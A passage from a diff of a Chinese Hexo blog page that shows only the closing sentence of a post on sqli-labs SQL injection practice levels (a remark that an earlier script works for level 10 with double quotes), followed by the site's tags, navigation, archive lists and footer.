+main()</code></pre><h3 id="less10-GET-–-Blind-–-Time-based-–-double-quotes"><a href="#less10-GET-–-Blind-–-Time-based-–-double-quotes" class="headerlink" title="less10(GET – Blind – Time based – double quotes)"></a>less10(GET – Blind – Time based – double quotes)</h3><p>同样可以用上面的脚本，把里面的单引号改为双引号就行</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://www.Gsuhy.cn/2018/02/05/sqli-labs训练（1-10）/" data-id="cjzljifcf003iioftfjyygoz7" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql/">sql</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2018/02/05/HGAME2018WP/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          HGAME2018WP WEEK1
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2018/02/05/PHP弱类型问题/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">PHP弱类型问题</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">分类</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/JAVA/">JAVA</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/JSP/">JSP</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Link/">Link</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Linux/">Linux</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Nginx/">Nginx</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/PHP/">PHP</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Python/">Python</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/SQL/">SQL</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/内网渗透/">内网渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/前端/">前端</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/学习/">学习</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/生活/">生活</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/JavaScript/">JavaScript</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Nginx/">Nginx</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WP/">WP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/jSP/">jSP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java/">java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/scrapy/">scrapy</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sites/">sites</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql/">sql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/内网渗透/">内网渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/生活/">生活</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CTF/" style="font-size: 12.5px;">CTF</a> <a href="/tags/JavaScript/" style="font-size: 10px;">JavaScript</a> <a href="/tags/Nginx/" style="font-size: 12.5px;">Nginx</a> <a href="/tags/PHP/" style="font-size: 17.5px;">PHP</a> <a href="/tags/WP/" style="font-size: 10px;">WP</a> <a href="/tags/jSP/" style="font-size: 10px;">jSP</a> <a href="/tags/java/" style="font-size: 10px;">java</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/python/" style="font-size: 20px;">python</a> <a href="/tags/scrapy/" style="font-size: 10px;">scrapy</a> <a href="/tags/sites/" style="font-size: 10px;">sites</a> <a href="/tags/sql/" style="font-size: 15px;">sql</a> <a href="/tags/内网渗透/" style="font-size: 10px;">内网渗透</a> <a href="/tags/生活/" style="font-size: 10px;">生活</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">八月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">七月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">四月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">三月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">二月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">十月 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/04/">四月 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">三月 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/02/">二月 2018</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2019/08/22/hello-world/">Hello World</a>
+          </li>
+        
+          <li>
+            <a href="/2019/08/11/javascript part1/">JavaScript part 1</a>
+          </li>
+        
+          <li>
+            <a href="/2019/07/24/内网渗透/">内网渗透思维导图</a>
+          </li>
+        
+          <li>
+            <a href="/2019/07/21/ubuntu配置nginx+php+mysql/">ubuntu or centos中配置nginx+php+mysql</a>
+          </li>
+        
+          <li>
+            <a href="/2019/07/20/sqli-labs训练(11-20)/">sqli-labs训练（less11-20）</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2019 Gsuhy<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
